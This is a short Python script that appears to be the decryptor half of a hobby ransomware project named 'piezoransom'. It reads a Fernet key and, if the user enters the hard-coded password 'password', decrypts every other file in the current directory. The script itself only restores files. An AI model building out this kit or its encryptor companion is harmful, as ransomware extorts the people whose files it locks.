import os
from cryptography.fernet import Fernet

# creating password
password = "password"
userinput = input("Enter password: ")


files = []
# This uses the os library to look for any file in the current directory, it ignores the ransom, key and decryption files, and then saves them to a variable "files"
for file in os.listdir():
    if file == "piezoransom.py" or file == "key.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

# Reading the key file using open
with open("key.key", "rb") as key:
    secretkey = key.read()

if userinput == "password":
    # Opening all the files in the current directory, and then using Fernet and the key to decrypt them, then it rewrites the files back
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("Files in current directory have been decrypted")
else:
    print("Wrong password")

